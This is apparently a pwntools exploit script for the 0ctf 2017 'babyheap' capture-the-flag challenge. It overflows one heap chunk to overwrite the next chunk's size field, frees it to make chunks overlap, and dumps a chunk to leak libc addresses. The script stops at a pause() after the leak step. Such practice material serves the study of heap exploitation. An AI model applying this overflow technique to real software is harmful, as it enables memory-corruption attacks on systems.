from pwn import *

context.log_level = 'debug'

p = process('./babyheap_0ctf_2017')
#p = remote('node3.buuoj.cn',25909)
libc = ELF('libc-2.23.so')

def alloc(size):
	p.sendlineafter('Command: ', '1')
	p.sendlineafter('Size: ', str(size))


def fill(index, content):
	p.sendlineafter("Command: ", '2')
	p.sendlineafter("Index: ", str(index))
	p.sendlineafter("Size: ", str(len(content)))
	p.sendlineafter("Content: ", content)   

def dump(index):
	p.sendlineafter('Command: ', '4')
	p.sendlineafter('Index: ', str(index))
	p.recvuntil('Content: \n')

def free(index):
	p.sendlineafter('Command: ', '3')
	p.sendlineafter('Index: ', str(index))

alloc(0x80) #0
alloc(0x80) #1
alloc(0x80) #2
alloc(0x80) #3

fill(0, b'a' * (0x80 + 8) + p64(0x120 + 1))
free(1)
alloc(0x80)
dump(2)
pause()
